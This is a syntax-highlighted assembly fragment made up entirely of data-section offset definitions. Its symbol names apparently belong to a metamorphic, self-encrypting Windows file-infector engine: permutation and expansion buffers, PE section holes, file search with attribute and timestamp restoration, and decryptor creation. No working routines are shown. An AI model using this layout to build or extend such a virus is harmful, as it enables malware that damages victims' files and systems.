</span><span class="sc5">AddressOfLastInstruction</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0038h</span><span class="sc0">
</span><span class="sc5">VariableTable</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">
</span><span class="sc5">NumberOfVariables</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0048h</span><span class="sc0">
</span><span class="sc5">FramesTable</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0050h</span><span class="sc0">
</span><span class="sc5">PermutationResult</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0058h</span><span class="sc0">
</span><span class="sc5">JumpsTable</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0060h</span><span class="sc0">
</span><span class="sc5">AddressOfLastFrame</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0068h</span><span class="sc0">
</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0070h</span><span class="sc0">
</span><span class="sc5">MODValue</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0078h</span><span class="sc0">
</span><span class="sc5">NumberOfJumps</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">
</span><span class="sc5">RndSeed1</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0088h</span><span class="sc0">
</span><span class="sc5">RndSeed2</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0090h</span><span class="sc0">
</span><span class="sc5">ExpansionResult</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0098h</span><span class="sc0">
</span><span class="sc5">Register8Bits</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00A0h</span><span class="sc0">
</span><span class="sc5">Xp_Register0</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00A8h</span><span class="sc0">
</span><span class="sc5">Xp_Register1</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00B0h</span><span class="sc0">
</span><span class="sc5">Xp_Register2</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00B8h</span><span class="sc0">
</span><span class="sc5">Xp_Register3</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00C0h</span><span class="sc0">
</span><span class="sc5">Xp_Register4</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00C8h</span><span class="sc0">
</span><span class="sc5">Xp_Register5</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00D0h</span><span class="sc0">
</span><span class="sc5">Xp_Register6</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00D8h</span><span class="sc0">
</span><span class="sc5">Xp_Register7</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00E0h</span><span class="sc0">
</span><span class="sc5">DeltaRegister</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00E8h</span><span class="sc0">
</span><span class="sc5">Xp_8Bits</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00F0h</span><span class="sc0">
</span><span class="sc5">Xp_Operation</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00F8h</span><span class="sc0">
</span><span class="sc5">Xp_Register</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">Xp_Mem_Index1</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0108h</span><span class="sc0">
</span><span class="sc5">Xp_Mem_Index2</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0110h</span><span class="sc0">
</span><span class="sc5">Xp_Mem_Addition</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0118h</span><span class="sc0">
</span><span class="sc5">Xp_Immediate</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0120h</span><span class="sc0">
</span><span class="sc5">Xp_SrcRegister</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0128h</span><span class="sc0">
</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0130h</span><span class="sc0">
</span><span class="sc5">Xp_RecurseLevel</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0138h</span><span class="sc0">
</span><span class="sc5">Xp_LEAAdditionFlag</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0140h</span><span class="sc0">
</span><span class="sc5">VarMarksTable</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0148h</span><span class="sc0">
</span><span class="sc5">_BUFFERS_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0150h</span><span class="sc0">
</span><span class="sc5">_CODE_SECTION</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0158h</span><span class="sc0">
</span><span class="sc5">_DISASM_SECTION</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0160h</span><span class="sc0">
</span><span class="sc5">_LABEL_SECTION</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0168h</span><span class="sc0">
</span><span class="sc5">_VARIABLE_SECTION</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0170h</span><span class="sc0">
</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0178h</span><span class="sc0">
</span><span class="sc5">_BUFFER2_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0180h</span><span class="sc0">
</span><span class="sc5">_VAR_MARKS_SECTION</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0188h</span><span class="sc0">
</span><span class="sc5">_DATA_SECTION</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0190h</span><span class="sc0">
</span><span class="sc5">_DISASM2_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0198h</span><span class="sc0">
</span><span class="sc5">New_CODE_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01A0h</span><span class="sc0">
</span><span class="sc5">New_DISASM_SECTION</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01A8h</span><span class="sc0">
</span><span class="sc5">New_BUFFERS_SECTION</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01B0h</span><span class="sc0">
</span><span class="sc1">; New_LABEL_SECTION       EQU     __DATA_SECTION + 01B0h</span><span class="sc0">
</span><span class="sc1">; New_VARIABLE_SECTION    EQU     __DATA_SECTION + 01B8h</span><span class="sc0">
</span><span class="sc1">; New_BUFFER1_SECTION     EQU     __DATA_SECTION + 01C0h</span><span class="sc0">
</span><span class="sc1">; New_BUFFER2_SECTION     EQU     __DATA_SECTION + 01C8h</span><span class="sc0">
</span><span class="sc1">; New_VAR_MARKS_SECTION   EQU     __DATA_SECTION + 01D0h</span><span class="sc0">
</span><span class="sc5">New_DATA_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01D8h</span><span class="sc0">
</span><span class="sc5">New_DISASM2_SECTION</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01E0h</span><span class="sc0">
</span><span class="sc5">RVA_GetModuleHandle</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01E8h</span><span class="sc0">
</span><span class="sc5">RVA_GetProcAddress</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01F0h</span><span class="sc0">
</span><span class="sc5">FlagAorW</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01F8h</span><span class="sc0">
</span><span class="sc5">ReturnValue</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">hKernel</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0208h</span><span class="sc0">
</span><span class="sc5">hUser32</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0210h</span><span class="sc0">
</span><span class="sc5">RVA_CreateFileA</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0218h</span><span class="sc0">
</span><span class="sc5">RVA_CreateFileMappingA</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0220h</span><span class="sc0">
</span><span class="sc5">RVA_MapViewOfFile</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0228h</span><span class="sc0">
</span><span class="sc5">RVA_UnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0230h</span><span class="sc0">
</span><span class="sc5">RVA_GetFileSize</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0238h</span><span class="sc0">
</span><span class="sc5">RVA_GetFileAttributesA</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0240h</span><span class="sc0">
</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0248h</span><span class="sc0">
</span><span class="sc5">RVA_SetFilePointer</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0250h</span><span class="sc0">
</span><span class="sc5">RVA_SetFileTime</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0258h</span><span class="sc0">
</span><span class="sc5">RVA_SetEndOfFile</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0260h</span><span class="sc0">
</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0268h</span><span class="sc0">
</span><span class="sc5">RVA_FindNextFileA</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0270h</span><span class="sc0">
</span><span class="sc5">RVA_FindClose</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0278h</span><span class="sc0">
</span><span class="sc5">RVA_CloseHandle</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0280h</span><span class="sc0">
</span><span class="sc5">RVA_MessageBoxA</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0288h</span><span class="sc0">
</span><span class="sc5">NewLabelTable</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0290h</span><span class="sc0">
</span><span class="sc5">Asm_ByteToSort</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0298h</span><span class="sc0">
</span><span class="sc5">JumpRelocationTable</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02A0h</span><span class="sc0">
</span><span class="sc5">NumberOfJumpRelocations</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02A8h</span><span class="sc0">
</span><span class="sc5">Permut_LastInstruction</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02B0h</span><span class="sc0">
</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02B8h</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02C0h</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02C8h</span><span class="sc0">
</span><span class="sc5">OriginalFileSize</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02D0h</span><span class="sc0">
</span><span class="sc5">hMapping</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02D8h</span><span class="sc0">
</span><span class="sc5">MappingAddress</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02E0h</span><span class="sc0">
</span><span class="sc5">HeaderAddress</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02E8h</span><span class="sc0">
</span><span class="sc5">StartOfSectionHeaders</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02F0h</span><span class="sc0">
</span><span class="sc5">RelocHeader</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02F8h</span><span class="sc0">
</span><span class="sc5">TextHeader</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0300h</span><span class="sc0">
</span><span class="sc5">DataHeader</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0308h</span><span class="sc0">
</span><span class="sc5">RVA_TextHole</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0310h</span><span class="sc0">
</span><span class="sc5">Phys_TextHole</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0318h</span><span class="sc0">
</span><span class="sc5">TextHoleSize</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0320h</span><span class="sc0">
</span><span class="sc5">RVA_DataHole</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0328h</span><span class="sc0">
</span><span class="sc5">Phys_DataHole</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0330h</span><span class="sc0">
</span><span class="sc5">MakingFirstHole</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0338h</span><span class="sc0">
</span><span class="sc5">ExitProcessAddress</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0340h</span><span class="sc0">
</span><span class="sc5">GetModuleHandleAddress</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0348h</span><span class="sc0">
</span><span class="sc5">GetProcAddressAddress</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0350h</span><span class="sc0">
</span><span class="sc5">VirtualAllocAddress</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0358h</span><span class="sc0">
</span><span class="sc5">GetModuleHandleMode</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0360h</span><span class="sc0">
</span><span class="sc5">VirtualPositionOfVar</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0368h</span><span class="sc0">
</span><span class="sc5">PhysicalPositionOfVar</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0370h</span><span class="sc0">
</span><span class="sc5">Kernel32Imports</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0378h</span><span class="sc0">
</span><span class="sc5">hFindFile</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0380h</span><span class="sc0">
</span><span class="sc5">Addr_FilePath</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0388h</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0390h</span><span class="sc0">
</span><span class="sc5">SizeOfNewCode</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0398h</span><span class="sc0">
</span><span class="sc5">FindFileData</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03A0h</span><span class="sc0">
</span><span class="sc5">OtherBuffers</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03A8h</span><span class="sc0">
</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03B0h</span><span class="sc0">
</span><span class="sc5">NewAssembledCode</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03B8h</span><span class="sc0">
</span><span class="sc5">NumberOfUndoActions</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03C0h</span><span class="sc0">
</span><span class="sc5">LastHeader</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03C8h</span><span class="sc0">
</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03D0h</span><span class="sc0">
</span><span class="sc5">CreatingADecryptor</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03D8h</span><span class="sc0">
